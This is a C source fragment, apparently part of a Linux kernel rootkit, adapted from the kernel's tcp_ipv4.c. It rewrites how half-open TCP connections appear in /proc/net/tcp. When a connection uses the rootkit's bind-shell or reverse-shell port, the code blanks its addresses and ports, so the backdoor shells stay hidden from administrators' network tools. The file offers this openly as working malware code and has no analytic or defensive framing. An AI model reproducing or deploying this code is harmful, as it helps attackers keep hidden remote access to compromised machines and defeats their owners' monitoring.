/* modified from original linux kernel source code at /usr/src/linux/net/ipv4/tcp_ipv4.c */

static void rk_get_openreq4(struct sock *sk, struct request_sock *req, struct seq_file *f, int i, int uid, int *len)
{
	const struct inet_request_sock *ireq = inet_rsk(req);
	int ttd = req->expires - jiffies, _hook;
	char rkport[12];
	char rkport2[12];
	char inet_sport[12];
	char rmt_port[12];
	
	sprintf(rkport, "%04X", bind_port);
	sprintf(rkport2, "%04X", reverse_shell_port);
	#if(LINUX_VERSION_CODE <= KERNEL_VERSION(2,6,32))
	sprintf(inet_sport, "%04X", ntohs(inet_sk(sk)->sport));
	#else	
	sprintf(inet_sport, "%04X", ntohs(inet_sk(sk)->inet_sport));
	#endif
	sprintf(rmt_port, "%04X", ntohs(ireq->rmt_port));
	if ((strcmp(inet_sport, rkport) != 0) && (strcmp(rmt_port, rkport) != 0) && (strcmp(inet_sport, rkport2) != 0) && (strcmp(rmt_port, rkport2) != 0)) 
		_hook = 0;
	else {
		_hook = 1;
	}
		#if(LINUX_VERSION_CODE <= KERNEL_VERSION(2,6,32))
	if (_hook == 0) 
		seq_printf(f, "%4d: %08X:%04X %08X:%04X"
		" %02X %08X:%08X %02X:%08lX %08X %5d %8d %u %d %p%n",
		i,
		ireq->loc_addr,
		ntohs(inet_sk(sk)->sport),
		ireq->rmt_addr,
		ntohs(ireq->rmt_port),
		TCP_SYN_RECV,
		0, 0, 
		1,    
		jiffies_to_clock_t(ttd),
		req->retrans,
		uid,
		0,  
		0, 
		atomic_read(&sk->sk_refcnt),
		req,
		len);
	else
		seq_printf(f, "%4d: %08X:%04X %08X:%04X"
		" %02X %08X:%08X %02X:%08lX %08X %5d %8d %u %d %p%n",
		i,
		0,
		ntohs(0),
		0,
		ntohs(0),
		TCP_SYN_RECV,
		0, 0, 
		1,    
		jiffies_to_clock_t(ttd),
		req->retrans,
		uid,
		0,  
		0, 
		atomic_read(&sk->sk_refcnt),
		req,
		len);

		#else
	if (_hook == 0) 
		seq_printf(f, "%4d: %08X:%04X %08X:%04X"
		" %02X %08X:%08X %02X:%08lX %08X %5d %8d %u %d %p%n",
		i,
		ireq->loc_addr,
		ntohs(inet_sk(sk)->inet_sport),
		ireq->rmt_addr,
		ntohs(ireq->rmt_port),
		TCP_SYN_RECV,
		0, 0, 
		1,    
		jiffies_to_clock_t(ttd),
		req->retrans,
		uid,
		0,  
		0, 
		atomic_read(&sk->sk_refcnt),
		req,
		len);
	else 
		seq_printf(f, "%4d: %08X:%04X %08X:%04X"
		" %02X %08X:%08X %02X:%08lX %08X %5d %8d %u %d %p%n",
		i,
		0,
		ntohs(0),
		0,
		ntohs(0),
		TCP_SYN_RECV,
		0, 0, 
		1,    
		jiffies_to_clock_t(ttd),
		req->retrans,
		uid,
		0,  
		0, 
		atomic_read(&sk->sk_refcnt),
		req,
		len);
		#endif /* eof #if(LINUX_VERSION_CODE <= KERNEL_VERSION(2,6,32)) */
}

